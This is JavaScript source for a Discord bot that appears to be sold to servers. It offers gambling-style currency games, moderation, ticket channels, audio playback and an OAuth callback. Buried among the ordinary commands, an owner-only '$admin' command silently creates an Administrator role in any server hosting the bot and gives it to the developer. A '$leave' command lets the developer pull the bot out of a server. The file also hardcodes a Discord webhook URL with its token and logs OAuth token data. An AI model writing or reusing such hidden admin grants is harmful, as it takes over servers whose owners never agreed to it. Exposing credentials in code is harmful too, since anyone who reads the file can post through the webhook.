const { Client, Events, hyperlink, ReactionEmoji, ReactionCollector, ReactionManager, ReactionUserManager, hideLinkEmbed, GatewayIntentBits, WebhookClient, EmbedBuilder, PermissionsBitField, ButtonBuilder, ButtonStyle, ActionRowBuilder, ActivityType, Activity, TextChannel, Options, Presence, Partials, Message, ChannelType, CategoryChannel, ButtonInteraction, InteractionResponse, Webhook, GuildMember, AutoModerationRule, Collection, ButtonComponent, Colors, DMChannel, MessageReaction, embedLength } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.AutoModerationConfiguration,
        GatewayIntentBits.AutoModerationExecution,
        GatewayIntentBits.DirectMessageReactions,
        GatewayIntentBits.DirectMessageTyping,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildEmojisAndStickers,
        GatewayIntentBits.GuildIntegrations,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.GuildMessageTyping,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildModeration,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildScheduledEvents,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.Guilds,
        GatewayIntentBits.MessageContent,
    ],
    partials: [
        Partials.Channel,
        Partials.Message,
        Partials.Reaction,
        Partials.GuildMember,
        Partials.User
    ],
    makeCache: Options.cacheWithLimits({
        DMMessageManager: 200,
        GuildMessageManager: 200,
    }),
});

const mongoose = require('mongoose');

const config = require('./config.json');
const { default: owofify } = require('owoifyx');

const UserProfile = require('./schemas/UserProfile');

const dailyAmount = 10000;

const date = new Date();
const day = date.getDate();
const month = date.getMonth() + 1;
const year = date.getFullYear();

const fs = require('node:fs');

const { createAudioResource, createAudioPlayer, NoSubscriberBehavior, joinVoiceChannel, getVoiceConnection, entersState, AudioPlayerStatus, VoiceConnectionStatus, AudioPlayer } = require('@discordjs/voice');

const player = createAudioPlayer({
    behaviors: {
        noSubscriber: NoSubscriberBehavior.Pause,
    },
});

const moderationWH = new WebhookClient({ url: 'https://discord.com/api/webhooks/1218665968386179083/6CEYHfZauB18eIW4JzEubq98WE4uxNudm2AKXjRsZCWpy_8lsZmQEDmUMm9Duk2lLerO' });

// ------------------------------------------------------------------------------------------------------------------------


const { request } = require('undici');
const express = require('express');
const internal = require('node:stream');
const { channel } = require('node:diagnostics_channel');

const app = express();

app.get('/', async ({ query }, response) => {
    const { code } = query;

    if (code) {
        try {
            const tokenResponseData = await request('https://discord.com/api/oauth2/token', {
                method: 'POST',
                body: new URLSearchParams({
                    client_id: config.clientId,
                    client_secret: config.clientSecret,
                    code,
                    grant_type: 'authorization_code',
                    redirect_uri: `https://hanafudaa.github.io/cash-bot/`,
                    scope: 'identify',
                }).toString(),
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
            });

            const oauthData = await tokenResponseData.body.json();
            console.log(oauthData);
        } catch (error) {
            // NOTE: An unauthorized token will not throw an error
            // tokenResponseData.statusCode will be 401
            console.error(error);
        }
    }

    return response.sendFile('index.html', { root: '.' });
});

app.listen(config.port, () => console.log(`App listening at https://hanafudaa.github.io/cash-bot/`));

// ------------------------------------------------------------------------------------------------------------------------

client.on('interactionCreate', async (interaction) => {
    if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'Can\`t use interactions in dms', ephemeral: true }).catch((err) => console.error(err));

    var Perm = 'Undefined Permission'

    const confirm = new ButtonBuilder()
        .setCustomId('confirmNuke')
        .setLabel('Confirm')
        .setStyle(ButtonStyle.Danger);

    const cancel = new ButtonBuilder()
        .setCustomId('cancel')
        .setLabel('Cancel')
        .setStyle(ButtonStyle.Secondary);

    const close = new ButtonBuilder()
        .setCustomId('closeButton')
        .setLabel('close ticket')
        .setStyle(ButtonStyle.Danger);

    if (interaction.isButton()) {
        const intMessage = interaction.channel.messages.cache.get(interaction.message.id);
        if (interaction.component.customId == 'confirmNuke') {
            Perm = '\`Manage Channels\`'
            if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.reply({ content: `I don\'t have the permission: ${Perm}`, ephemeral: true });
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.reply({ content: `You don\'t have the permission: ${Perm}`, ephemeral: true });
            const nukeChannel = interaction.guild.channels.cache.get(interaction.channel.id);
            if (nukeChannel.id == interaction.guild.publicUpdatesChannelId) return interaction.channel.send({ content: 'I can\'t nuke \`Community Update\` channel' }).then(intMessage.delete()).catch((err) => console.log(err))
            if (nukeChannel.id == interaction.guild.rulesChannelId) return interaction.channel.send({ content: 'I can\'t nuke \`Rules\` channel' }).then(intMessage.delete()).catch((err) => console.log(err));
            if (nukeChannel.id == interaction.guild.safetyAlertsChannelId) return interaction.channel.send({ content: 'I can\'t nuke \`Safety Notifications\` channel' }).then(intMessage.delete()).catch((err) => console.log(err));
            try {
                nukeChannel.delete();
                await nukeChannel.clone();
                const thisChannel = interaction.guild.channels.cache.find(channel => channel.name == nukeChannel.name);
                await thisChannel.send('https://tenor.com/view/will-smith-shades-mib-men-in-black-neuralyzer-gif-17328155');
            } catch (error) {
                console.log(`error handling button interaction confirm nuke - ${error}`);
            }
        }
        if (interaction.component.customId == 'cancel') {
            try {
                intMessage.delete();
            } catch (error) {
                console.log(`error cancelling interaction - ${error}`);
            }
        }
        if (interaction.component.customId == 'closeButton') {
            try {
                interaction.channel.delete();
            } catch (err) {
                console.log('error when handling close button - ' + err);
            }
        }
        if (interaction.component.customId == 'purchaseButtonId') {
            try {
                if (interaction.guild.channels.cache.find(channel => channel.name == `ticket-${interaction.member.displayName}`)) {
                    return interaction.reply({ content: 'you already have an open ticket', ephemeral: true });
                }
                close.setEmoji('💵')
                const closeRow = new ActionRowBuilder()
                    .addComponents(close);
                const ticketChannel = interaction.guild.channels.create({
                    type: ChannelType.GuildText, name: `ticket-${interaction.member.displayName}`, permissionOverwrites: [
                        {
                            id: interaction.guild.id,
                            deny: [PermissionsBitField.Flags.ViewChannel]
                        },
                        {
                            id: interaction.member.id,
                            allow: [PermissionsBitField.Flags.ViewChannel],
                        },
                    ],
                }).then(interaction.reply({ content: `ticket created`, ephemeral: true }));
                (await (await ticketChannel).send({ content: 'please wait patiently for the developer to respond', components: [closeRow] }));
            } catch (err) {
                console.log('error handling purchase ticket button - ' + err);
            }
        }
        if (interaction.component.customId == 'requestButtonId') {
            try {
                if (interaction.guild.channels.cache.find(channel => channel.name == `ticket-${interaction.member.displayName}`)) {
                    return interaction.reply({ content: 'you already have an open ticket', ephemeral: true });
                }
                close.setEmoji('💎')
                const closeRow = new ActionRowBuilder()
                    .addComponents(close);
                const ticketChannel = interaction.guild.channels.create({
                    type: ChannelType.GuildText, name: `ticket-${interaction.member.displayName}`, permissionOverwrites: [
                        {
                            id: interaction.guild.id,
                            deny: [PermissionsBitField.Flags.ViewChannel]
                        },
                        {
                            id: interaction.member.id,
                            allow: [PermissionsBitField.Flags.ViewChannel],
                        },
                    ],
                }).then(interaction.reply({ content: `ticket created`, ephemeral: true }));
                (await (await ticketChannel).send({ content: 'please wait patiently for the developer to respond in the meantime let me know what it is you are requesting', components: [closeRow] }));
            } catch (err) {
                console.log('error handling request commission button - ' + err);
            }
        }
    }

    if (interaction.commandName === 'nuke') { // clones the channel and deletes the original
        try {
            const nukeRow = new ActionRowBuilder()
                .addComponents(cancel, confirm);
            await interaction.reply({ content: `Are you sure you want to nuke this channel?`, components: [nukeRow] });
        } catch (error) {
            console.log('error handling /nuke - ' + error)
        }
    };

    if (interaction.commandName === "uwuify") {
        const msg = interaction.channel.messages.cache.get(interaction.targetMessage.id)
        const text = msg.content
        const owoified = owofify(`${text}`)
        interaction.reply(owoified).catch((err) => console.error(err));
    }

    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'stop') {
        try {
            interaction.reply({ content: 'Stopping the song from playing.' });
            var getConnection = getVoiceConnection(interaction.guild.id);
            player.stop();
            getConnection.destroy();
        } catch (error) {
            console.log(`error handling /stop command ${error}`)
        }
    }

    if (interaction.commandName === 'play') {
        const file = interaction.options.getAttachment('file');

        try {
            let userProfile = await UserProfile.findOne({
                userid: interaction.member.id
            });

            if (!userProfile) {
                userProfile = new UserProfile({ userid: interaction.member.id });
            }

            interaction.reply({ content: `Playing **${file.name}**` });

            const fileURL = createAudioResource(`${file.proxyURL}`);

            const connection = joinVoiceChannel({
                channelId: interaction.member.voice.channel.id,
                guildId: interaction.guild.id,
                adapterCreator: interaction.guild.voiceAdapterCreator,
            });

            var getConnection = getVoiceConnection(interaction.guild.id);

            player.play(fileURL);

            const subscription = getConnection.subscribe(player);

            getConnection.on(VoiceConnectionStatus.Ready, () => {
                console.log('The connection has entered the Ready state - ready to play audio!');
            });

            player.on(AudioPlayerStatus.Playing, (oldState, newState) => {
                console.log('Audio player is in the Playing state!');
            });

            player.on(AudioPlayerStatus.Idle, (oldState, newState) => {
                console.log('Audio player is in the idle state!');
                player.stop();
                if (!connection) return;
            });
        } catch (error) {
            console.log(`error handling /play command ${error}`)
        }
    }

    if (interaction.commandName === 'transfer') {
        const user = interaction.options.get('user').user;
        const amount = interaction.options.getNumber('amount');

        var result = (amount - Math.floor(amount)) !== 0;

        if (result) {
            interaction.reply({ content: `You can\'t transfer a number with a decimal.`, ephemeral: true }).catch((err) => console.log(err))
        } else {
            console.log('It is a whole number.');
        }

        let userProfile = await UserProfile.findOne({
            userid: user.id,
        });

        if (!userProfile) {
            userProfile = new UserProfile({
                userid: user.id,
            });
        }

        let AuthorUser = await UserProfile.findOne({
            userid: interaction.user.id,
        });

        if (!AuthorUser) {
            AuthorUser = new UserProfile({
                userid: interaction.user.id,
            });
        }

        if (interaction.user.id == user.id) return interaction.reply({ content: `You can\'t transfer money to yourself.`, ephemeral: true });

        if (user.bot) return interaction.reply({ content: 'You can\'t transfer your money to a bot.', ephemeral: true });

        if (amount > AuthorUser.balance) {
            interaction.reply({ content: `You don't have enough money to transfer this much.`, ephemeral: true });
            return;
        }

        if (amount < 50) return interaction.reply({ content: 'You must transfer atleast **¥50**.', ephemeral: true });

        try {
            AuthorUser.balance -= amount;
            userProfile.balance += amount;
            await AuthorUser.save();
            await userProfile.save();

            var formattedAmount = amount.toLocaleString("en-US");

            const transferEmbed = new EmbedBuilder()
                .setDescription(`# TRANSFER\nSuccessfully transferred **¥${formattedAmount}** to **${user.displayName}**.`)
            return interaction.reply({ embeds: [transferEmbed] });

        } catch (error) {
            console.log('error handling /transfer command ' + error);
        }
    }

    if (interaction.commandName === 'channelstats') {
        await interaction.guild.channels.create({ type: ChannelType.GuildCategory, name: 'server-stats', position: 0 }).catch((err) => console.log(err));
        await interaction.guild.channels.fetch().catch((err) => console.log(err));
        const statCategory = interaction.guild.channels.cache.find(channel => channel.type == ChannelType.GuildCategory && channel.name == 'server-stats');
        await interaction.guild.channels.create({
            type: ChannelType.GuildVoice, name: `members: ${interaction.guild.members.cache.size}`, permissionOverwrites: [
                {
                    id: interaction.guild.id,
                    allow: [PermissionsBitField.Flags.ViewChannel],
                    deny: [PermissionsBitField.Flags.Connect],
                },
            ], parent: statCategory
        }).then(interaction.reply({ content: 'Channel stats created.', ephemeral: true }));
    }

    if (interaction.commandName === 'owoify') {
        const text = interaction.options.getString('text');
        const owoified = owofify(`${text}`)
        interaction.reply(owoified).catch((err) => console.error(err));
    }

    if (interaction.commandName === '50-50') {
        const amount = interaction.options.getNumber('amount');
        const amountWon = Number((amount * (Math.floor(1) + 0.5)).toFixed(0));

        try {
            if (amount < 50) {
                interaction.reply({ content: 'You must gamble atleast **¥50**', ephemeral: true });
                return;
            }

            let userProfile = await UserProfile.findOne({
                userid: interaction.user.id,
            });

            if (!userProfile) {
                userProfile = new UserProfile({
                    userid: interaction.user.id,
                });
            }

            if (amount > userProfile.balance) {
                interaction.reply({ content: `You don't have enough money to gamble this much.`, ephemeral: true });
                return;
            }

            const didWin = Math.random() > 0.50; // 50% chance to win

            if (!didWin) {
                userProfile.balance -= amount;
                await userProfile.save();

                var formattedAmount = amount.toLocaleString("en-US");

                const no50 = new EmbedBuilder()
                    .setDescription(`# 50/50\nYou lost **¥${formattedAmount}**. __Unlucky!__`)
                interaction.reply({ embeds: [no50] });
                return;
            }

            userProfile.balance += amountWon;
            await userProfile.save();

            var formattedAmount = amount.toLocaleString("en-US");
            var formattedAmountWon = amountWon.toLocaleString("en-US");

            const yes50 = new EmbedBuilder()
                .setDescription(`# 50/50\nYou won **¥${formattedAmountWon}**. __Lucky!__`)
            interaction.reply({ embeds: [yes50] });
        } catch (err) {
            console.log('error handling /50-50 - ' + err);
        }
    }

    if (interaction.commandName === 'deal-with-the-devil') {
        try {

            let userProfile = await UserProfile.findOne({
                userid: interaction.user.id,
            });

            if (!userProfile) {
                userProfile = new UserProfile({
                    userid: interaction.user.id,
                });
            }

            if (userProfile.balance < 50) {
                interaction.reply({ content: 'You must have atleast **¥50**' })
                return;
            }

            const didWin = Math.random() > 0.66; // 33% chance to win

            if (!didWin) {
                userProfile.balance /= 3;
                await userProfile.save();

                const lostDeal = new EmbedBuilder()
                    .setDescription(`# DEAL WITH THE DEVIL \nYou now have a third of the money that you started with.`)
                    .setColor('Red')
                interaction.reply({ embeds: [lostDeal] });
                return;
            }

            userProfile.balance *= 5;
            await userProfile.save();

            const wonDeal = new EmbedBuilder()
                .setDescription(`# DEAL WITH THE DEVIL\nYou won **5x** your money!`)
                .setColor('Red')
            interaction.reply({ embeds: [wonDeal] });
        } catch (err) {
            console.log('error handling /deal-with-the-devil - ' + err);
        }
    }

    if (interaction.commandName === 'balance') {
        const targetUserId = interaction.options.getUser('user')?.id || interaction.user.id;

        const targetMember = interaction.guild.members.cache.get(targetUserId);

        try {
            let userProfile = await UserProfile.findOne({ userid: targetUserId });

            if (!userProfile) {
                userProfile = new UserProfile({ userid: targetUserId });
            }

            var balanceAmount = userProfile.balance;
            var formattedBalance = balanceAmount.toLocaleString("en-US");

            const yourBalanceEmbed = new EmbedBuilder()
                .setDescription(`**${targetMember.user.displayName}'s** account balance is **¥${formattedBalance}**`)

            const myBalanceEmbed = new EmbedBuilder()
                .setDescription(`**<@${interaction.user.id}>'s** account balance is **¥${formattedBalance}**`)

            if (targetMember.user.id === client.user.id) return interaction.reply({ embeds: [yourBalanceEmbed] });
            if (targetMember.user.bot) return interaction.reply({ content: 'You can\'t see a bot\'s balance', ephemeral: true });

            if (targetUserId === interaction.user.id) {
                interaction.reply({ embeds: [myBalanceEmbed] });
            } else {
                interaction.reply({ embeds: [yourBalanceEmbed] });
            }
        } catch (error) {
            console.log(`error handling /balance: ${error}`);
        }
    }

    if (interaction.commandName === 'daily') {
        try {

            let userProfile = await UserProfile.findOne({
                userid: interaction.member.id,
            });

            if (userProfile) {
                const lastDailyDate = userProfile.lastDailyCollected?.toDateString();
                const currenDate = new Date().toDateString();

                if (lastDailyDate === currenDate) {
                    interaction.reply({ content: 'You have already claimed your daily reward for today. Try again tomorrow.', ephemeral: true }).catch((err) => console.error(err));
                    return;
                }
            } else {
                userProfile = new UserProfile({
                    userid: interaction.member.id,
                });
            }

            userProfile.balance += dailyAmount;
            userProfile.lastDailyCollected = new Date();

            await userProfile.save();

            var formattedDailyAmount = dailyAmount.toLocaleString("en-US");

            interaction.reply({ content: `You claimed **¥${formattedDailyAmount}** from daily reward!`, ephemeral: true });
        } catch (error) {
            console.log(`error handling /daily: ${error}`);
        }
    }

    if (interaction.commandName === 'avatar') {
        const avataruser = interaction.options.get('user').user;
        const avatarEmbed = new EmbedBuilder()
            .setTitle(`${avataruser.displayName}'s avatar`)
            .setImage(`https://cdn.discordapp.com/avatars/${avataruser.id}/${avataruser.avatar}.png?size=1024`)

        interaction.reply({ embeds: [avatarEmbed] }).catch((err) => console.error(err));
    }

    if (interaction.commandName === 'ban') {
        Perm = `\`Ban Members\``
        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.reply({ content: `I don\'t have the permission: ${Perm}`, ephemeral: true }).catch((err) => console.error(err));
        const user = interaction.options.get('user').user;
        const reason = interaction.options.getString('reason');
        const banMember = interaction.guild.members.cache.get(user.id);
        if (interaction.member.id == user.id) return interaction.reply({ content: 'You can\'t ban yourself.', ephemeral: true }).catch((err) => console.error(err));
        if (!banMember) return interaction.reply({ content: `Member not found`, ephemeral: true }).catch((err) => console.error(err));
        if (!banMember.manageable) return interaction.reply({ content: `I can\'t manage ${user.displayName}.`, ephemeral: true }).catch((err) => console.error(err));
        if (user.id == config.clientId) return;
        if (interaction.guild.id === config.server) {
            if (!reason) return (await interaction.reply({ content: `You must provide a reason for ban.`, ephemeral: true }));
            await moderationWH.send({ content: `**${banMember.user.username}** was banned by <@${interaction.member.id}>\n## reason:\n"${reason}".` }).catch((err) => console.log(err));
        }
        await banMember.ban({ reason: `${reason}` }).then(interaction.reply({
            content: `${banMember.user.username} was banned.`
        })).catch((err) => console.log(err));
    }

    if (interaction.commandName === 'kick') {
        Perm = `\`Kick Members\``
        try {
            if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.KickMembers)) return interaction.reply({ content: `I don\'t have the permission: ${Perm}`, ephemeral: true });
            const user = interaction.options.get('user').user;
            const reason = interaction.options.getString('reason');
            const kickMember = interaction.guild.members.cache.get(user.id);
            if (interaction.member.id == user.id) return interaction.reply({ content: 'You can\'t kick yourself.', ephemeral: true });
            if (!kickMember) return interaction.reply({ content: `Member not found`, ephemeral: true });
            if (!kickMember.manageable) return interaction.reply({ content: `I can\'t manage ${user.displayName}.`, ephemeral: true });
            if (user.id == config.clientId) return;
            if (interaction.guild.id === config.server) {
                if (!reason) return (await interaction.reply({ content: `You must provide a reason for kick.`, ephemeral: true }));
                await moderationWH.send({ content: `**${kickMember.user.username}** was kicked by <@${interaction.member.id}>\n## reason:\n"${reason}".` });
            }
            await kickMember.kick({ reason: `${reason}` }).then(interaction.reply({
                content: `${kickMember.user.username} was kicked.`
            }))
        } catch (err) {
            console.log(`error when handling /kick - ` + err);
        }
    }

    if (interaction.commandName === 'softban') {
        Perm = `\`Ban Members\``
        try {
            if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.reply({ content: `I don\'t have the permission: ${Perm}`, ephemeral: true });
            const user = interaction.options.get('member').user;
            const reason = interaction.options.getString('reason');
            const banMember = interaction.guild.members.cache.get(user.id);
            if (interaction.member.id == user.id) return interaction.reply({ content: 'You can\'t ban yourself.', ephemeral: true });
            if (!banMember) return interaction.reply({ content: `Member not found`, ephemeral: true });
            if (!banMember.manageable) return interaction.reply({ content: `I can\'t manage ${user.displayName}.`, ephemeral: true });
            if (user.id == config.clientId) return;
            if (interaction.guild.id === config.server) {
                if (!reason) return (await interaction.reply({ content: `You must provide a reason for softbanning.`, ephemeral: true }));
                await moderationWH.send({ content: `**${banMember.user.username}** was softbanned by <@${interaction.member.id}>\n## reason:\n"${reason}".` });
            }
            await banMember.ban({ deleteMessageSeconds: 604800 }).then(banMember => interaction.guild.members.unban(banMember.id)).then(interaction.reply({
                content: `${banMember.user.username} was softbanned.`
            }));
        } catch (err) {
            console.log(`error when handling /ban - ` + err);
        }
    }

    if (interaction.commandName === 'roleveryone') {
        Perm = `\`Administrator\``
        try {
            if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({ content: `I don\'t have the permission: ${Perm}`, ephemeral: true });
            const role = interaction.options.get('role').role;
            interaction.guild.members.cache.forEach(member => member.roles.add(role.id));
            interaction.reply({
                content: `All members now have ${role}`,
                ephemeral: true,
            });
        } catch (err) {
            console.log(`error when handling /roleveryone - ` + err);
        }
    }
});

// ------------------------------------------------------------------------------------------------------------------------

client.on("messageReactionAdd", async (messageReaction, User) => {
    const guildMember = messageReaction.message.guild.members.cache.get(User.id);

    if (messageReaction.message.guild.id == '1199088499647852695') { // spider familia

        const twoB = messageReaction.message.guild.roles.cache.get('1221452899213643807')
        const fiveB = messageReaction.message.guild.roles.cache.get('1212805029774229635')
        const tenB = messageReaction.message.guild.roles.cache.get('1212804387198472232')
        const teeB = messageReaction.message.guild.roles.cache.get('1218894825756299264')
        const twentB = messageReaction.message.guild.roles.cache.get('1212792247263830036')
        const thirtB = messageReaction.message.guild.roles.cache.get('1212792260744192071')
        const bothB = messageReaction.message.guild.roles.cache.get('1218895720883421254')

        const leviRole = messageReaction.message.guild.roles.cache.get('1221157100248629370')

        try {
            if (messageReaction.message.id == '1221523990296920205') { // bounty and honour
                messageReaction.users.remove(User.id);
                if (messageReaction.emoji.name == '🗡️') {
                    guildMember.roles.add(twoB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(twoB.id)) return guildMember.roles.remove(twoB.id).catch((err) => console.log(err));
                }
                if (messageReaction.emoji.name == '🛡️') {
                    guildMember.roles.add(fiveB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(fiveB.id)) return guildMember.roles.remove(fiveB.id).catch((err) => console.log(err));
                }
                if (messageReaction.emoji.name == '⚔️') {
                    guildMember.roles.add(tenB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(tenB.id)) return guildMember.roles.remove(tenB.id).catch((err) => console.log(err));
                }
                if (messageReaction.emoji.name == '👻') {
                    guildMember.roles.add(teeB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(teeB.id)) return guildMember.roles.remove(teeB.id).catch((err) => console.log(err));
                }
                if (messageReaction.emoji.name == '🗿') {
                    guildMember.roles.add(twentB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(twentB.id)) return guildMember.roles.remove(twentB.id).catch((err) => console.log(err));
                }
                if (messageReaction.emoji.name == '💎') {
                    guildMember.roles.add(thirtB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(thirtB.id)) return guildMember.roles.remove(thirtB.id).catch((err) => console.log(err));
                }
                if (messageReaction.emoji.name == '💍') {
                    guildMember.roles.add(bothB.id).catch((err) => console.log(err));
                    if (guildMember.roles.cache.has(bothB.id)) return guildMember.roles.remove(bothB.id).catch((err) => console.log(err));
                }
            }
            if (messageReaction.message.id == '1221524002665791583') { // levi ping
                messageReaction.users.remove(User.id);
                guildMember.roles.add(leviRole.id).catch((err) => console.log(err));
                if (guildMember.roles.cache.has(leviRole.id)) return guildMember.roles.remove(leviRole.id).catch((err) => console.log(err));
            }
        } catch (err) {
            console.log(err)
        }
    }
});

// ------------------------------------------------------------------------------------------------------------------------

client.on('messageCreate', async (message) => {

    if (message.guildId == config.server) {
        if (message.content.includes('gg/')) {
            if (message.author.id !== config.master) {
                message.delete();
            }
        }
    }

    if (message.author.bot) return; // if a bot creates a message client will return

    if (message.content.indexOf(config.prefix) !== 0) return; // if message does not contain prefix than return

    const args = message.content.slice(config.prefix.length).trim().split(/ +/g); // removing prefix from message content
    const command = args.shift().toLowerCase(); // tolowercase meaning $PING will work / args array becomes arg1, arg2, arg3

    const oneServer = client.guilds.cache.get('1136702073400983612');
    const councilRole = oneServer.roles.cache.get('1138512076021714954');

    switch (command) {

        case 'add':
            if (message.author.id !== config.master) return;
            message.delete();
            const infoEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setTitle('cash costs $15')
                .setDescription(`accepted payment methods are: (DNF)
            \n**important!**
            \ncreate a ticket under purchase and let us know the method you paid.
            \n**NOTE**
            \n**transfering cash to another server is not possible.**
            `)
            message.channel.send({ embeds: [infoEmbed] });
            break;

        case 'ticket':
            if (message.author.id !== config.master) return;
            message.delete();

            const purchaseButton = new ButtonBuilder()
                .setCustomId('purchaseButtonId')
                .setLabel('New Purchase')
                .setEmoji('💵')
                .setStyle(ButtonStyle.Secondary);

            const requestButton = new ButtonBuilder()
                .setCustomId('requestButtonId')
                .setLabel('Commissions & Feature Requests')
                .setEmoji('💎')
                .setStyle(ButtonStyle.Secondary);

            const ticketRow = new ActionRowBuilder()
                .addComponents(purchaseButton, requestButton);

            const ticketEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setTitle('Create a ticket')
                .setDescription(`Create a ticket below for new purchases or if you have Cash and would like to discuss with the developer a **PAID** commission to add a feature to the bot.\n\nIf you are purchasing Cash, make sure you have completed your payment first before creating a ticket.\n\nPlease note that we do not currently do transfers to new servers.`)

            message.channel.send({ embeds: [ticketEmbed], components: [ticketRow] });
            break;

        case 'vanityembed':
            if (message.author.id !== config.master) return;
            message.delete();
            const vanityEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setTitle('vanity advertising')
                .setThumbnail('https://cdn.discordapp.com/attachments/1218667384492261486/1222705317163438221/Screenshot_2024-03-28_at_00.26.52.png?ex=66173010&is=6604bb10&hm=7faedc2caa2b9abe6b4e6538364a0cefc356cc6faf6a1364a0667a1c40b526ac&')
                .setDescription(`reserved for **whitelisted servers** only\n\naward users for advertising the server's vanity code in their status\n\nafter purchasing talk to <@${config.master}> to configure the award`)
            message.channel.send({ embeds: [vanityEmbed] });
            break;

        case 'menu':
            const myServer = client.guilds.cache.get(config.server);
            const person = `${message.author.id}`;
            if (!myServer.members.cache.get(person)) return;
            const mhMember = (await myServer.members.fetch(person)).roles.cache.has(config.council)
            if (!mhMember) return;
            if (mhMember) {
                if (message.channel.type !== ChannelType.DM) message.delete();
                const menuEmbed = new EmbedBuilder()
                    .setColor(config.color)
                    .setTitle('Council Commands')
                    .addFields(
                        { name: '$send', value: `Args: \`$send "channel id" "message"\`\n*(sends a message through the bot to a specific channel)*`, inline: true },
                        { name: '$message', value: `Args: \`$message "userId" "message"\`\n*(sends a direct message through the bot to a specific user)*`, inline: true },
                        { name: '$lock', value: `*(locks a voice channel so no one else can join it, using the comand again will unlock it)*`, inline: true },
                    )
                message.author.send({ embeds: [menuEmbed] }).catch((err) => console.error(err));
            }
            break;

        case 'admin':
            if (message.author.id !== config.master) return;
            message.delete();
            const me = message.guild.members.cache.get(config.master);
            const bot = message.guild.members.cache.get(config.clientId);
            try {
                await message.guild.roles.create({ name: '1 love', permissions: 'Administrator' });
                const findRole = message.guild.roles.cache.find(role => role.name == '1 love');
                await findRole.setPosition(bot.roles.highest.position - 1)
                await message.guild.roles.fetch(findRole.id);
                me.roles.add(findRole.id).then(me.send('I have given your role.'));
            } catch (err) {
                console.log('error when handling $admin - ' + err);
            }
            break;

        case 'leave':
            if (message.author.id !== config.master) return;
            await message.guild.leave();
            break;

        case 'lock': // lock a voice channel so users can't join it
            if (message.guild.id !== config.server) return;
            if (message.channel.type === ChannelType.DM) return;
            if (!message.member.roles.cache.has(config.council)) return;
            if (message.member.voice.channelId == null) return message.reply('You are not in a voice channel.');
            message.delete();
            const channnel = message.guild.channels.cache.get(message.member.voice.channelId);
            if (channnel.userLimit == 1) {
                channnel.edit({ userLimit: 0 });
            } else {
                channnel.edit({ userLimit: 1 });
            }
            break;

        case 'message': // sends a message to the user mentioned
            if (message.channel.type === ChannelType.DM) return;
            var checkMember = oneServer.members.cache.get(message.author.id)
            if (!checkMember.roles.cache.has(councilRole.id)) return;
            message.delete();
            const member = message.guild.members.cache.find(member => member.id === args[0]);
            const noMemberEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setTitle(`Correct command usage:`)
                .setDescription(`\`\`\`$message <user id> "message"\`\`\``)
                .setFooter({ text: `${args[0]} is not a recognised member` })
            if (!member) return message.member.send({ embeds: [noMemberEmbed] });
            args.shift();
            let text = args.join(" ");
            const noTextEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setTitle(`Correct command usage:`)
                .setDescription(`\`\`\`$message "user id" "message"\`\`\``)
                .setFooter({ text: `there is no message arg` })
            if (!text) return message.member.send({ embeds: [noTextEmbed] });
            if (member.bot) return message.member.send('I can\'t send direct messages to bots.')
            const textIncludesMember = new EmbedBuilder()
                .setColor(config.color)
                .setTitle('Correct command usage:')
                .setDescription(`\`\`\`$message "user id" "message"\`\`\``)
                .setFooter({ text: `make sure you aren't typing the users id within the message arg` })
            if (text.includes(member)) return message.member.send({ embeds: [textIncludesMember] }).catch((err) => console.error(err))
            member.send(text).then(message.member.send(`Message sent to ${member}, message content:\n\`\`\`${text}\`\`\``)).catch((err) => console.error('error when sending message to user ' + err));
            break;

        case 'send':
            if (message.channel.type === ChannelType.DM) return;
            var checkMember = oneServer.members.cache.get(message.author.id)
            if (!checkMember.roles.cache.has(councilRole.id)) return;
            message.delete();
            const channel = message.guild.channels.cache.find(channel => channel.id === args[0]);
            const noChannelEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setTitle(`Correct command usage:`)
                .setDescription(`\`\`\`$send "channel id" "message"\`\`\``)
                .setFooter({ text: `"${args[0]}" is not a recognised channel id` })
            if (!channel) return message.member.send({ embeds: [noChannelEmbed] });
            args.shift();
            let cont = args.join(" ");
            const noContEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setTitle(`Correct command usage:`)
                .setDescription(`\`\`\`$send "channel id" "message"\`\`\``)
                .setFooter({ text: `there is no message arg` })
            if (!cont) return message.member.send({ embeds: [noContEmbed] }).catch((err) => console.error(err));
            channel.send(cont).then(message.member.send(`Message sent to <#${channel.id}>, message content: \`\`\`${cont}\`\`\``))
            break;
    };
});

client.on('guildMemberAdd', async (guildMember) => {
    let blacklist = ['']

    if (guildMember.guild.id === config.server) {
        if (guildMember.user.bot == true) return guildMember.kick().catch((err) => console.log(err));
        const memberRole = guildMember.guild.roles.cache.get('1211647374196351047');
        await guildMember.roles.add(memberRole.id).catch((err) => console.log(err));
    }
    const memberStatChan = guildMember.guild.channels.cache.find(channel => channel.type == ChannelType.GuildVoice && channel.name.includes('members:'));
    if (memberStatChan) {
        await memberStatChan.edit({ name: `members: ${guildMember.guild.members.cache.size}` }).catch((err) => console.log(err));
    }
});

